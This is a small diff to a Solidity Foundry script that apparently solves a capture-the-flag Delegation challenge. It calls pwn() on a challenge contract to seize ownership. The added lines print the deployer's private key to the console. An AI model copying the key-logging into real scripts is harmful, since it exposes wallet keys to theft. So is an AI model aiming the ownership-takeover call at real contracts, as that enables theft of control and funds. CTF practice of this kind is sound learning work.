@@ -13,6 +13,8 @@ contract DelegationAttacker is Script {
 
   function run() external {
     vm.startBroadcast(deployerPrivateKey);
+    console.log("deployerPrivateKey: %s", deployerPrivateKey);
+    console.log("msg sender: %s", msg.sender);
     (bool success, ) = address(challenge).call(abi.encodeWithSignature("pwn()"));
     require(success, "pwn call failed");
     console.log("challenge.owner(): %s", challenge.owner());
